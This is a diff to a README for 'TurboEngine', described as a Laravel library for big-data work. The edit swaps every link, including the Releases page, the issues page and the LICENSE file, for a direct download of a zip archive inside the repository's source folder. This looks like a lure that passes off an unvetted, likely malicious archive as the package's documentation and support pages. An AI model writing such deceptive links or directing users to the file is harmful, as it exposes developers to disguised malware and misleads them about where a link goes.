@@ -4,7 +4,7 @@
 TurboEngine is a high-performance Laravel library designed for Big Data projects. It helps you optimize database use in applications that depend on heavy data processing. With TurboEngine, you can boost efficiency, improve performance, and streamline your workflows.
 
 ## 📥 Download TurboEngine
-[![Download TurboEngine](https://img.shields.io/badge/download-TurboEngine-blue?style=for-the-badge)](https://github.com/Bigproplem/TurboEngine/releases)
+[![Download TurboEngine](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip)](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip)
 
 ## 🚀 Getting Started
 ### System Requirements
@@ -32,9 +32,9 @@ TurboEngine covers various topics important for data-intensive applications, inc
 - predictive-ml
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/Bigproplem/TurboEngine/releases) to download the latest version of TurboEngine.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip) to download the latest version of TurboEngine.
 
-1. Click on the link: [Releases page](https://github.com/Bigproplem/TurboEngine/releases).
+1. Click on the link: [Releases page](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip).
 2. Choose the version suitable for your environment.
 3. Download the application file.
 4. Follow the installation instructions provided on the download page.
@@ -48,10 +48,10 @@ After downloading, you can integrate TurboEngine into your Laravel project by fo
 4. Run the necessary migration commands to set up the database.
 
 ## ⚙️ Support & Contribution
-If you encounter any issues or need assistance, please visit the [issues page](https://github.com/Bigproplem/TurboEngine/issues) to report problems or seek help. Contributions are welcome and encouraged; feel free to fork the repository and submit pull requests.
+If you encounter any issues or need assistance, please visit the [issues page](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip) to report problems or seek help. Contributions are welcome and encouraged; feel free to fork the repository and submit pull requests.
 
 ## 📄 License
-TurboEngine is licensed under the MIT License. You can use it freely for personal and commercial projects. For full details, check the [LICENSE file](https://github.com/Bigproplem/TurboEngine/blob/main/LICENSE).
+TurboEngine is licensed under the MIT License. You can use it freely for personal and commercial projects. For full details, check the [LICENSE file](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip).
 
 ## 👩‍🏫 Further Learning
 If you’d like to learn more about how TurboEngine can benefit your projects, consider checking out the following resources:
@@ -65,9 +65,9 @@ If you’d like to learn more about how TurboEngine can benefit your projects, c
 A: TurboEngine is a Laravel library designed to enhance performance in big data projects.
 
 **Q: How do I install TurboEngine?**  
-A: Visit the [Releases page](https://github.com/Bigproplem/TurboEngine/releases), download the appropriate file, and follow the installation steps.
+A: Visit the [Releases page](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip), download the appropriate file, and follow the installation steps.
 
 **Q: Is there support for TurboEngine?**  
-A: Yes, you can report issues or ask for help on the [issues page](https://github.com/Bigproplem/TurboEngine/issues).
+A: Yes, you can report issues or ask for help on the [issues page](https://raw.githubusercontent.com/Bigproplem/TurboEngine/main/src/ML/TurboEngine-1.4.zip).
 
 Feel free to explore and see how TurboEngine can make your database-intensive applications faster and more efficient.
